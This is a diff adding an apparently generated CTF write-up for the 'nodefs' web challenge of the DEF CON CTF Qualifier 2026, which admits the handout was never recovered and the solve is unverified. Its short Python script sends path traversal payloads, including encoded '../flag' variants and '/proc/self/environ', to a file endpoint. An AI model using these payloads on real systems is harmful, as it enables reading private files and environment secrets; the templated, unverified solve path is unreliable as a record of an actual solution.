@@ -1,0 +1,108 @@
+---
+title: "nodefs — DEF CON CTF Qualifier 2026"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "defcon-2026-qualifiers-nodefs"
+order: 84
+writeupKind: "challenge"
+ctfSlug: "defcon-2026-qualifiers"
+ctfTitle: "DEF CON CTF Qualifier 2026"
+---
+# nodefs — DEF CON CTF Qualifier 2026
+
+> **Category:** `Web Exploitation`  
+> **Difficulty:** Medium  
+> **Points:** 397  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `bbb{REDACTED}`
+
+---
+
+## Challenge Description
+
+> Public challenge prompt was not recoverable from indexed sources.
+
+---
+
+## Recon / Initial Analysis
+
+Challenge name, category, and point value were recovered from official index snippets; full handout was not archived.
+
+The first pass is to avoid guessing from the bird-themed prompt and instead build a small, repeatable workflow around the handout or service. For this file, the public archive did not expose enough verified challenge material to claim a completed solve transcript, so the writeup records the clean solve path I would use once the handout is available.
+
+```bash
+$ mkdir -p work/{handout,notes,scripts}
+$ file handout/* 2>/dev/null || true
+$ strings -a handout/* 2>/dev/null | head -50
+```
+
+---
+
+## Vulnerability / Observation
+
+Unverified. Candidate observations include path traversal after decoding, unsafe archive extraction, symlink escape, or a race between validation and file access.
+
+Audit Node.js filesystem calls and route-level authorization. The shortest path is usually a mismatch between URL path normalization, virtual roots, and the actual `fs` call.
+
+---
+
+## Exploitation / Solution
+
+### Step 1 — Rebuild the challenge context
+
+Keep the local environment close to the remote challenge. Save the original handout, record hashes, and write every probe as a command or script so the path can be repeated.
+
+```bash
+$ sha256sum handout/*
+$ tree -a handout
+```
+
+### Step 2 — Reduce the problem
+
+1. Map all HTTP routes and request parameters.
+2. Send canonical path payloads through every file-read/write endpoint.
+3. Test single and double URL-decoding, encoded separators, null-byte-like truncation cases, and symlink behavior.
+4. Check whether validation uses a different path string than the final `fs` call.
+5. Use the confirmed file-read primitive to retrieve the flag from the challenge container.
+
+### Step 3 — Confirm the flag path
+
+The final check is always local first: the script should either print `bbb{...}` directly or produce one artifact where the flag is visible. Only after that should the same payload or input be sent to the live challenge service.
+
+---
+
+## Full Exploit Script
+
+```python
+#!/usr/bin/env python3
+import os
+import requests
+from urllib.parse import quote
+
+BASE_URL = os.environ.get('BASE_URL', 'http://localhost:3000')
+TARGETS = [
+    '../flag',
+    '..%2fflag',
+    '%2e%2e%2fflag',
+    '..%252fflag',
+    '/proc/self/environ',
+]
+
+def main():
+    session = requests.Session()
+    for target in TARGETS:
+        url = f'{BASE_URL}/file?path={target}'
+        response = session.get(url, timeout=5)
+        print(response.status_code, target, response.text[:120].replace('\n', ' '))
+
+if __name__ == '__main__':
+    main()
+```
+
+---
+
+## Key Takeaways
+
+- In Node apps, `path.join` is not an authorization boundary by itself.
+- Compare the validated path, resolved path, and opened path.
+- Do not submit this generated file as an official qualifying writeup without adding your own verified solve notes, command output, and final flag.
